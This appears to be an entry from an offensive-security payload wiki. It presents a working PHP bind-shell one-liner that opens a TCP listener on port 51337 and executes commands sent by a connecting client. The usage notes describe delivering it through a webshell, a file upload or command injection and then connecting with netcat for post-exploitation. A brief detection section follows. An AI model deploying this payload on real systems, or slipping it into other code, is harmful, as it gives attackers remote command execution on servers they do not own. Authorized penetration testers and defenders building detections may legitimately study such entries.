---
id: 87e78db0-e3e6-42e4-b258-f5e2137dbb63
name: PHP-Bind-Shell-One-Liner
type: code
language: PHP
verified: true
created_at: '2023-04-06T03:56:08.800575+00:00'
updated_at: '2023-04-10T20:21:13.691090+00:00'
platforms:
  - Linux
  - Web
tags:
  - bind-shell
  - php
  - payload
validated: true
---

# PHP-Bind-Shell-One-Liner

## Code

```php
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
```

## Description

This PHP one-liner creates a bind shell by establishing a TCP socket listener on port 51337. Upon connection, it reads commands from the client, executes them using popen, and relays the output back, providing interactive shell access without requiring additional files on the target.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 51337 | Hardcoded listening port; modify in code for custom port | 4444 |

## Usage

Execute directly on the target via command line or embed in a web-accessible PHP file and trigger via HTTP request (e.g., curl http://target/shell.php). Then connect from attacker machine using netcat: `nc target_ip 51337`. Ideal for quick post-exploitation after RCE or file upload in web apps. Can be delivered via webshell or command injection.

## Detection

- Monitor PHP processes for socket_create or popen usage via audit logs or EDR.
- Network monitoring for unexpected listeners on high ports from web server IPs.
- Web server access logs for suspicious PHP executions or file uploads.
- Process monitoring: Look for php processes with high CPU or child processes spawning shells.

## Related

- [[procedures/Establish-PHP-Bind-Shell]]
- [[tools/Netcat]]
